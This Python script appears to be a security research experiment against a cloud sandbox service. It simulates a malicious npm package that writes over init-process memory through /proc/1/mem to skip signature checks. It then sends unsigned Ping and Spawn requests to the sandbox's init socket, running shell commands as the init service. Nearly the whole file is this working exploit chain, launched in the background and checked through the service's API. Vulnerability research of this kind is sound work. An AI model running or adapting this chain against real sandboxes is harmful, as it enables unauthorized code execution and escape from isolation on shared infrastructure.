# -*- coding: utf-8 -*-
"""实验J279: 恶意包场景 - 任意沙箱内进程 (setsid bg) 全链利用
bg 脚本: 1) 写 /proc/1/mem patch verify  2) 免签 Ping  3) 免签 Spawn id
        4) 结果写文件 (全程模拟恶意 npm 包代码, 不经 cmd 通道特权)
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

# 恶意包模拟: 完整攻击链 (patch + 免签 Ping + 免签 Spawn)
BG_ATTACK = r'''
import os, socket, struct, json as _j, time

def log(msg):
    with open("/tmp/atk.log", "a") as f:
        f.write(msg + "\n")

log("=== ATTACK START uid=%d ===" % os.getuid())

# 1) patch /proc/1/mem (绕过签名验证)
try:
    fd = os.open("/proc/1/mem", os.O_RDWR)
    os.lseek(fd, 0x77ba00, 0)
    old = os.read(fd, 5)
    log("OLD: " + old.hex())
    if old == bytes.fromhex("4c8d6424a8"):
        os.lseek(fd, 0x77ba00, 0)
        os.write(fd, bytes.fromhex("31c031dbc3"))
        os.lseek(fd, 0x77ba00, 0)
        log("PATCHED: " + os.read(fd, 5).hex())
    else:
        log("PATTERN_DIFF")
    os.close(fd)
except Exception as e:
    log("PATCH_ERR %s: %s" % (type(e).__name__, e))

# 2) 免签 Ping
try:
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(6)
    sock.connect("/run/vercel/share/init.sock")
    body = b"{}"
    req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.1\r\n"
           b"Host: init\r\nContent-Type: application/json\r\n"
           b"Connect-Protocol-Version: 1\r\n"
           b"Content-Length: 2\r\nConnection: close\r\n\r\n" + body)
    sock.sendall(req)
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
    except socket.timeout:
        pass
    sock.close()
    log("PING_RESP: %r" % data[:300])
except Exception as e:
    log("PING_ERR %s: %s" % (type(e).__name__, e))

# 3) 免签 Spawn (保持连接, 执行命令)
try:
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(8)
    sock.connect("/run/vercel/share/init.sock")
    msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "id; whoami; cat /etc/hostname"],
                    "environment": []}).encode()
    body = b"\x00" + struct.pack(">I", len(msg)) + msg
    req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
           b"Host: init\r\nContent-Type: application/connect+json\r\n"
           b"Connect-Protocol-Version: 1\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n"
           b"Connection: close\r\n\r\n" + body)
    sock.sendall(req)
    data = b""
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
            data += d
    except socket.timeout:
        pass
    sock.close()
    log("SPAWN_RESP: %r" % data[:800])
except Exception as e:
    log("SPAWN_ERR %s: %s" % (type(e).__name__, e))

log("=== ATTACK DONE ===")
'''

NAME = "expj279"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A: 启动恶意包模拟 (setsid 后台, 不经 cmd 通道特权)
CODE_A = r'''
import subprocess
open("/tmp/atk.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/atk.py"],
    stdout=open("/tmp/atk.out", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("atk pid", r.pid, flush=True)
''' % BG_ATTACK
run_cmd(sid, CODE_A, "A_ATK", timeout=100)

# B: 12 秒后检查攻击日志
time.sleep(12)
CODE_B = r'''
import os
print("atk.log exists:", os.path.exists("/tmp/atk.log"), flush=True)
if os.path.exists("/tmp/atk.log"):
    print(open("/tmp/atk.log").read()[:2500], flush=True)
print("--- atk.out ---", flush=True)
if os.path.exists("/tmp/atk.out"):
    print(open("/tmp/atk.out").read()[:500], flush=True)
'''
run_cmd(sid, CODE_B, "B_CHECK", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
